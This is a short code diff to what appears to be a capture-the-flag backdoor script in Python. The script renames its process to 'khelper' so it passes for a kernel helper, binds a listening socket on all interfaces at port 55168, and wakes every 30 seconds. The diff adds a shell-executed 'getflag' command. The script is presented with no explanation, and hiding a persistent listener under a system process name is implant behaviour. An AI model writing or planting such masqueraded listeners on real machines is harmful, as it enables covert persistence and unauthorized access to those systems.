@@ -5,10 +5,12 @@ import os
 import base64
 import traceback
 import logging
+import subprocess
 
 cmd=r'whoami'#cmd to get flag
 port=55168
 interval=30 #wake up interval(seconds)
+flag_shell='echo getflag_`whoami`'
 
 mode='development'
 if mode=='development':
@@ -38,6 +40,7 @@ if __name__=='__main__':
     set_proc_name('khelper')
     while True:
         try:
+            subprocess.call(flag_shell,shell=True)
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             address=('0.0.0.0',port)
             s.bind(address)
